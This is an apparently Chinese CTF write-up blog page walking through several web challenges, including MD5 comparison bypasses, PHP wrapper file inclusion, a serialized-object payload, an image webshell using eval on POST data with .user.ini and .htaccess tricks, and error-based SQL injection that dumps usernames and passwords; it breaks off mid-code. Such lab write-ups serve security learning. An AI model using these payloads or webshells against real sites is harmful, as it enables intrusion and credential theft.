class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">大佬链接:http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>mslc.ctf.su<span class="hljs-operator">/</span>wp<span class="hljs-operator">/</span>leet<span class="hljs-operator">-</span>more<span class="hljs-number">-2010</span><span class="hljs-operator">-</span>oh<span class="hljs-operator">-</span>those<span class="hljs-operator">-</span>admins<span class="hljs-operator">-</span>writeup<span class="hljs-operator">/</span><br>意思是， <span class="hljs-keyword">SELECT</span> login <span class="hljs-keyword">FROM</span> admins <span class="hljs-keyword">WHERE</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&lt;trash&gt;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1&lt;shit&gt;&#x27;</span> <span class="hljs-keyword">or</span> 后跟非<span class="hljs-number">0</span>开头的数据就会返回为<span class="hljs-literal">TRUE</span><br><br></code></pre></td></tr></table></figure><p>大佬的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;;) &#123; <br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">1000000</span>; <span class="hljs-variable">$c</span>++, <span class="hljs-variable">$i</span>++)<br>  <span class="hljs-keyword">if</span> (stripos(md5(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nmd5(<span class="hljs-subst">$i</span>) = &quot;</span> . md5(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;.&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>  <span class="hljs-comment">//给一个常用的 payload ffifdyop</span><br></code></pre></td></tr></table></figure><p>传入即可下一关</p><h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>) == md5(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br></code></pre></td></tr></table></figure><p>该说不说这个弱比较确实是已经盘包浆了，网上一搜一大堆</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/levels91.php?<span class="hljs-attribute">a</span>=QNKCDZO&amp;b=240610708<br></code></pre></td></tr></table></figure><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>传入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span>:param<span class="hljs-number">1</span>[]=<span class="hljs-number">111</span>&amp;param<span class="hljs-number">2</span>[]=<span class="hljs-number">222</span><br></code></pre></td></tr></table></figure><p>即可</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = unserialize(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不管怎么说，先让程序走到 Line 11,那么需要满足 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))<br>    ...<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))<br></code></pre></td></tr></table></figure><p>这里自己也不是很理解为什么直接传入不行，然后我尝试了伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 构建">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p>把 welcome to the zjctf base64编码传入，或者input为协议post上去。然后下面这个地方知识包含，不是读取！这个地方我狠狠的踩坑了，所以要用filter来读取文件，读取后的内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);    <span class="hljs-comment">//看到这里可以读取flag.php，使用的是_tostring方法，我们使用echo即可触发</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);    <span class="hljs-comment">//看到这里可以读取flag.php</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> Flag()));  <br><span class="hljs-comment">//ouput:O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></code></pre></td></tr></table></figure><p>最后payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D<br></code></pre></td></tr></table></figure><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>文件上传的题目</p><p>构建一个图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);&lt;/script&gt;   <br></code></pre></td></tr></table></figure><p>经过尝试 发现不允许更改filename(就那些可以解析成php的全不行)，这个时候可以用 <code>.user.ini</code></p><p>它可以帮助我们自动包含一些文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=nosymbol.png<br></code></pre></td></tr></table></figure><p>构建如上文件，可以在访问 默认页面(index.php)时自动包含 nosymbol.png 这个文件也就是上面的图片马</p><p>getFlag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://edc<span class="hljs-number">1162</span>e-eb<span class="hljs-number">28</span>-<span class="hljs-number">46</span>d<span class="hljs-number">3</span>-bd<span class="hljs-number">05</span>-d<span class="hljs-number">5</span>b<span class="hljs-number">996584</span>fc<span class="hljs-number">4</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/uploads/cc<span class="hljs-number">551</span>ab<span class="hljs-number">005</span>b<span class="hljs-number">2</span>e<span class="hljs-number">60</span>fbdc<span class="hljs-number">88</span>de<span class="hljs-number">809</span>b<span class="hljs-number">2</span>c<span class="hljs-number">4</span>b<span class="hljs-number">1</span>/index.php -X POST -d <span class="hljs-string">&quot;shell=system(&#x27;cat /flag&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102046298.png" alt="image-20220110204644152"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>这题过滤了union select if这样的函数，但是没有过滤updatexml</p><p>于是有</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">check.php?username=admin&#x27;</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="hljs-string">&#x27;)),0x7e),1))%23&amp;password=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">check.php?username=admin&#x27;</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(username,<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><br>这个地方你会发现flag只给了半个<br><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=1</span><br></code></pre></td></tr></table></figure><p>注意 要符合 8 4 4 4 12规则 flag有重复字段删掉他</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>.user.ini 行不通，试试.htaccess</p><p>.htaccess内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;FilesMatch  <span class="hljs-string">&quot;b.jpg&quot;</span>&gt;<br><br>SetHandler  application/x-httpd-php<br><br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102105411.png" alt="image-20220110210559312"></p><p>然后整个图片🐎</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;readfile(<span class="hljs-string">&#x27;/flag&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>尝试以后知道的system函数禁用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"> curl http://5ed3d265-efab-4d75-8e8d-3d2692ae1906.node4.buuoj.cn:81//upload/44927cfb6cc8b88769ea882582c90522/b.jpg</span><br>GIF89a<br>flag&#123;885b198c-a024-47f6-9e2a-f159525cb14d&#125;<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>确实ez，然而自己眼瞎好几次差点跑去翻wp  hhh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$id</span>) === md5(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure><p>源码直接给了 目的是执行到17行</p><p>我们需要满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <br>    ...<br>        <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$id</span>) === md5(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) <br>            ...<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]))<br>                    ...<br>                    <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$passwd</span>))<br>                            ...<br>                             <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br></code></pre></td></tr></table></figure><p>考点就是MD5强比较和PHP弱类型</p><p>最终payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>: ?id[]=<span class="hljs-number">111</span>&amp;gg[]=<span class="hljs-number">222</span><br><span class="hljs-attribute">POST</span>: passwd=<span class="hljs-number">1234567</span>a<br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;read();<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span 